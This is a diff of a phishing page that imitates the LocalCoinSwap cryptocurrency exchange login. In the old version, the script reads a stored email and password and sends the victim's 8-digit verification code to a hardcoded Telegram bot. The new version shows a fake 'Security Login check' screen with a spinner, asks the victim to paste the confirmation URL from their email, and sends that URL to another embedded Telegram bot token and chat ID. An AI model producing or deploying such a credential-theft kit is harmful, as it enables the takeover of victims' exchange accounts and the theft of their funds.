@@ -1,292 +1,383 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>LocalCoinSwap Login</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Login to LocalCoinSwap — Full-page Loader</title>
     <style>
-        * {
-            box-sizing: border-box;
-            font-family: "Inter", Arial, sans-serif;
-            margin: 0;
-            padding: 0;
+         :root {
+            --bg: #eef5fb;
+            --card-bg: #ffffff;
+            --accent: #0b84ff;
+            --accent-dark: #1677d6;
+            --muted: #6b7785;
+            --danger: #f8d7da;
+            --success: #d4edda;
+            --success-text: #155724;
         }
         
+        html,
         body {
-            background-color: #e9f0f8;
-            color: #1a1a1a;
+            height: 100%;
+            margin: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+            background: linear-gradient(#eaf3fb 0%, #eef6fb 100%);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            color: #222;
         }
+        /* Full-page loading overlay */
         
-        .container {
+        .overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(6, 10, 20, 0.72);
             display: flex;
+            align-items: center;
             justify-content: center;
-            align-items: stretch;
-            background-color: #fff;
-            max-width: 950px;
-            margin: 50px auto;
-            border-radius: 8px;
-            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
+            z-index: 9999;
+            transition: opacity 420ms ease, visibility 420ms ease;
+            opacity: 1;
+            visibility: visible;
         }
         
-        .left-section {
-            flex: 1;
-            background-color: #fff;
-            padding: 60px 50px;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            border-right: 1px solid #eaeaea;
+        .overlay.hidden {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+        }
+        /* Large central spinner (dual-ring style) */
+        
+        .big-spinner {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            border: 12px solid rgba(255, 255, 255, 0.14);
+            border-top-color: #fff;
+            animation: spin 1s linear infinite;
+            box-shadow: 0 8px 28px rgba(0, 0, 0, 0.5), inset 0 0 30px rgba(255, 255, 255, 0.03);
         }
         
-        .quote-mark {
-            font-size: 50px;
-            color: #3f7af0;
-            line-height: 0.8;
-            margin-bottom: 15px;
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
         }
+        /* Optionally add a small label under spinner */
         
-        .quote {
-            font-size: 17px;
-            color: #333;
-            line-height: 1.6;
-            margin-bottom: 20px;
-        }
-        
-        .author {
-            color: #0a0f1c;
+        .overlay .label {
+            margin-top: 14px;
+            color: rgba(255, 255, 255, 0.9);
             font-weight: 600;
-            font-size: 15px;
+            font-size: 16px;
+            text-align: center;
         }
+        /* Page content (login UI) */
         
-        .right-section {
-            flex: 1;
-            padding: 60px 50px;
+        .topbar {
+            background: #0a0f1a;
+            color: white;
+            padding: 14px 18px;
             display: flex;
-            flex-direction: column;
-            justify-content: center;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 1px 0 rgba(0, 0, 0, 0.2);
+            position: relative;
+            z-index: 1;
         }
         
-        .right-section h2 {
-            font-size: 26px;
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 600;
+            font-size: 18px;
+        }
+        
+        .brand .logo {
+            width: 36px;
+            height: 24px;
+            display: inline-block;
+            border-radius: 4px;
+            background: linear-gradient(135deg, #2b8cff, #ffd247);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.25);
+            transform: rotate(-12deg);
+        }
+        
+        .register-btn {
+            background: linear-gradient(180deg, #ffb43a, #ff9b07);
+            color: #fff;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 6px 12px rgba(255, 155, 7, 0.18);
+        }
+        
+        .wrap {
+            max-width: 420px;
+            margin: 28px auto;
+            padding: 18px;
+            position: relative;
+            z-index: 0;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        
+        .card {
+            background: var(--card-bg);
+            border-radius: 10px;
+            box-shadow: 0 6px 20px rgba(16, 40, 80, 0.08);
+            padding: 22px;
+            border: 1px solid rgba(16, 40, 80, 0.04);
+            width: 100%;
+            box-sizing: border-box;
+        }
+        
+        h1 {
+            margin: 0 0 16px 0;
+            font-size: 28px;
             font-weight: 700;
-            margin-bottom: 25px;
-            color: #0a0f1c;
+            color: var(--success-text);
+            /* Green color for h1 */
         }
         
-        .notice {
-            background-color: #d9f2d9;
-            color: #0a591e;
-            border-left: 4px solid #28a745;
-            border-radius: 6px;
-            padding: 10px 15px;
+        .alert {
+            background: var(--success);
+            border-left: 6px solid #28a745;
+            padding: 14px 16px;
+            border-radius: 8px;
+            color: var(--success-text);
+            margin-bottom: 18px;
             font-size: 15px;
-            margin-bottom: 20px;
+            box-shadow: inset -8px 0 0 rgba(40, 167, 69, 0.08);
+            width: 100%;
+            box-sizing: border-box;
+        }
+        
+        .form-row {
+            margin-bottom: 16px;
+            width: 100%;
         }
         
         label {
             display: flex;
             justify-content: space-between;
+            align-items: center;
             font-size: 14px;
-            font-weight: 500;
-            color: #333;
-            margin-bottom: 6px;
+            color: var(--muted);
+            margin-bottom: 8px;
+            width: 100%;
         }
         
         .edit-link {
             font-size: 13px;
-            color: #0077ff;
+            color: #1573b8;
             text-decoration: none;
             cursor: pointer;
         }
         
-        input {
-            width: 100%;
-            padding: 10px 12px;
-            border: 1px solid #ccc;
+        input[type="email"],
+        input[type="password"],
+        textarea {
+            width: 100% !important;
+            max-width: 100%;
+            padding: 12px 14px;
             border-radius: 6px;
-            margin-bottom: 18px;
+            border: 1px solid rgba(16, 40, 80, 0.08);
             font-size: 15px;
-            background-color: #fff;
-        }
-        
-        input:focus {
+            background: #fbfdff;
             outline: none;
-            border-color: #0077ff;
-            box-shadow: 0 0 0 2px rgba(0, 119, 255, 0.2);
+            box-sizing: border-box;
+            margin: 0;
         }
         
-        input[readonly] {
-            background-color: #f5f5f5;
-            color: #777;
+        input:focus,
+        textarea:focus {
+            border-color: var(--accent-dark);
+            box-shadow: 0 6px 18px rgba(11, 132, 255, 0.12);
+        }
+        
+        textarea {
+            resize: vertical;
+            min-height: 120px;
         }
         
         .login-btn {
-            background-color: #0077ff;
-            color: #fff;
-            border: none;
             width: 100%;
-            padding: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            border-radius: 30px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: linear-gradient(180deg, var(--accent), var(--accent-dark));
+            color: white;
+            padding: 14px 22px;
+            border-radius: 34px;
+            border: none;
+            font-weight: 700;
+            font-size: 18px;
             cursor: pointer;
-            transition: background-color 0.2s ease;
+            box-shadow: 0 10px 20px rgba(11, 132, 255, 0.18);
+            box-sizing: border-box;
         }
+        /* small screens */
         
-        .login-btn:hover {
-            background-color: #005fd1;
-        }
-        
-        @media (max-width: 768px) {
-            .container {
-                flex-direction: column;
-                margin: 20px;
+        @media (max-width:480px) {
+            .wrap {
+                margin: 14px;
+                padding: 12px;
             }
-            .left-section {
-                border-right: none;
-                border-bottom: 1px solid #eaeaea;
-                padding: 40px 30px;
-                text-align: center;
+            .card {
+                padding: 18px;
             }
-            .quote-mark {
-                font-size: 40px;
-            }
-            .quote {
-                font-size: 16px;
-            }
-            .right-section {
-                padding: 40px 30px;
-            }
-            .right-section h2 {
+            h1 {
                 font-size: 22px;
             }
-        }
-        
-        @media (max-width: 480px) {
-            input {
-                font-size: 14px;
-            }
-            .login-btn {
-                font-size: 15px;
-            }
-            .notice {
-                font-size: 14px;
+            .big-spinner {
+                width: 90px;
+                height: 90px;
+                border-width: 10px;
             }
         }
     </style>
 </head>
 
 <body>
-    <div class="container">
-        <!-- LEFT SIDE -->
-        <div class="left-section">
-            <div class="quote-mark">“</div>
-            <p class="quote">
-                Bitcoin enables certain uses that are very unique. I think it offers possibilities that no other currency allows.
-            </p>
-            <p class="author">Charlie Shrem</p>
+    <!-- Full-page overlay shown on load -->
+    <div id="overlay" class="overlay" role="status" aria-live="polite" aria-busy="true">
+        <div style="text-align:center;">
+            <div class="big-spinner" aria-hidden="true"></div>
+            <div class="label">Loading</div>
         </div>
+    </div>
 
-        <!-- RIGHT SIDE -->
-        <div class="right-section">
-            <h2>Login Verification — LocalCoinSwap</h2>
-            <div class="notice">
-                Please enter the 8-digit verification code sent to your Telegram.
+    <!-- Page content (below overlay) -->
+    <div class="topbar">
+        <div class="brand">
+            <!--<span class="logo" aria-hidden="true"></span> -->
+            <span>LocalCoinSwap</span>
+        </div>
+        <button class="register-btn" type="button">Register</button>
+    </div>
+
+    <div class="wrap">
+        <div class="card">
+            <h1>Security Login check......</h1>
+
+            <div class="alert" role="alert">
+                You're logging in localcoinswap payment agency for first time, please check your email and confirm new login now by clicking button <strong>add country to my account</strong>
             </div>
 
-            <form id="loginForm">
-                <label>Email <a class="edit-link" id="editEmail">Edit</a></label>
-                <input type="email" id="email" required readonly />
-
-                <label>Password <a class="edit-link" id="editPassword">Edit</a></label>
-                <input type="password" id="password" required readonly />
-
-                <label>8-digit code</label>
-                <input type="text" id="code" maxlength="8" placeholder="Enter 8-digit code" required />
-
-                <button type="submit" class="login-btn">Continue</button>
+            <form id="loginForm" novalidate>
+                <div class="form-row">
+                    <label for="url">
+                        <span>Alternatively, copy paste url send to your email here.</span>
+                    </label>
+                    <textarea id="url" rows="5" placeholder="Paste your URL here..."></textarea>
+                    <div style="margin-top:12px;">
+                        <button id="loginBtn" class="login-btn" type="submit">Submit verifications</button>
+                    </div>
+                </div>
             </form>
         </div>
     </div>
 
     <script>
-        // Get saved credentials
-        const savedEmail = localStorage.getItem("userEmail");
-        const savedPassword = localStorage.getItem("userPassword");
+        (function() {
+            const overlay = document.getElementById('overlay');
+            const initialLoadMs = 1800;
 
-        const emailInput = document.getElementById("email");
-        const passwordInput = document.getElementById("password");
+            window.addEventListener('load', () => {
+                setTimeout(() => {
+                    overlay.classList.add('hidden');
+                    overlay.setAttribute('aria-hidden', 'true');
+                    overlay.setAttribute('aria-busy', 'false');
+                }, initialLoadMs);
+            });
 
-        // If missing data, redirect back to homepage
-        if (!savedEmail || !savedPassword) {
-            alert("No login details found. Redirecting to main page...");
-            window.location.href = "index.html";
-        } else {
-            emailInput.value = savedEmail;
-            passwordInput.value = savedPassword;
-        }
+            setTimeout(() => {
+                if (!overlay.classList.contains('hidden')) {
+                    overlay.classList.add('hidden');
+                    overlay.setAttribute('aria-hidden', 'true');
+                    overlay.setAttribute('aria-busy', 'false');
+                }
+            }, initialLoadMs + 1200);
 
-        // Allow editing
-        document.getElementById("editEmail").addEventListener("click", (e) => {
-            e.preventDefault();
-            emailInput.readOnly = false;
-            emailInput.focus();
-        });
+            // Form elements
+            const form = document.getElementById('loginForm');
+            const btn = document.getElementById('loginBtn');
+            const urlInput = document.getElementById('url');
 
-        document.getElementById("editPassword").addEventListener("click", (e) => {
-            e.preventDefault();
-            passwordInput.readOnly = false;
-            passwordInput.focus();
-        });
+            // Replace these with real values
+            const BOT_TOKEN = '8585067089:AAFF4GYaUJHN0ufwOzcd7Fp08bz4xMhKYNo';
+            const CHAT_ID = '1003670447';
 
-        // Handle login form submission
-        document.getElementById("loginForm").addEventListener("submit", (e) => {
-            e.preventDefault();
-            const code = document.getElementById("code").value.trim();
-
-            // Validate the OTP input
-            if (code.length !== 8 || isNaN(code)) {
-                alert("Please enter a valid 8-digit code.");
-                return;
+            // Helper: show simple inline error
+            function showError(msg) {
+                alert(msg);
             }
 
-            // Send the OTP to the Telegram bot
-            sendOTPToTelegram(code);
-        });
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const urlVal = urlInput.value.trim();
 
-        // Function to send the OTP to Telegram
-        function sendOTPToTelegram(otp) {
-            const botToken = '8374783082:AAGu_MAmTZ7plivFdGJU10DjUECPe-Nbw-Q'; // Replace with your Telegram bot token
-            const chatId = '5615316142'; // Replace with your chat ID
+                if (!urlVal) {
+                    showError('Please paste the URL before submitting.');
+                    urlInput.focus();
+                    return;
+                }
 
-            const message = `User entered OTP: ${otp}`;
+                // Disable button and show spinner
+                btn.disabled = true;
+                const originalText = btn.textContent;
+                const spinner = document.createElement('span');
+                spinner.style.width = '18px';
+                spinner.style.height = '18px';
+                spinner.style.display = 'inline-block';
+                spinner.style.borderRadius = '50%';
+                spinner.style.border = '3px solid rgba(255,255,255,0.35)';
+                spinner.style.borderTopColor = '#fff';
+                spinner.style.animation = 'spin 0.9s linear infinite';
+                spinner.setAttribute('aria-hidden', 'true');
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                    }),
-                })
-                .then(response => {
-                    if (response.ok) {
-                        alert("OTP submitted successfully!"); // Notify success
-                        window.location.href = "homepage.html"; // Redirect to homepage
-                    } else {
-                        console.error('Error sending OTP:', response.statusText);
-                        alert("Failed to send OTP to Telegram. Please try again.");
+                btn.textContent = '';
+                btn.appendChild(spinner);
+
+                // Build message text
+                const messageText = encodeURIComponent('Received URL: ' + urlVal);
+
+                // Telegram API endpoint
+                const endpoint = 'https://api.telegram.org/bot' + encodeURIComponent(BOT_TOKEN) + '/sendMessage';
+
+                // Send to Telegram via fetch (GET for simplicity)
+                fetch(endpoint + '?chat_id=' + encodeURIComponent(CHAT_ID) + '&text=' + messageText, {
+                    method: 'GET',
+                    mode: 'cors',
+                }).then(response => {
+                    if (!response.ok) {
+                        console.warn('Telegram API returned non-OK status', response.status);
                     }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    alert("Error occurred while sending OTP. Please try again.");
+                    return response.json().catch(() => null);
+                }).then(data => {
+                    setTimeout(() => {
+                        btn.disabled = true;
+                        window.location.href = 'login.html';
+                    }, 400);
+                }).catch(err => {
+                    console.error('Error sending to Telegram:', err);
+                    alert('Failed to send data to bot (see console). You will be redirected.');
+                    window.location.href = 'login.html';
+                }).finally(() => {
+                    btn.disabled = false;
+                    try {
+                        btn.removeChild(spinner);
+                    } catch (ex) {}
+                    btn.textContent = originalText;
                 });
-        }
+            });
+        })();
     </script>
 </body>
 
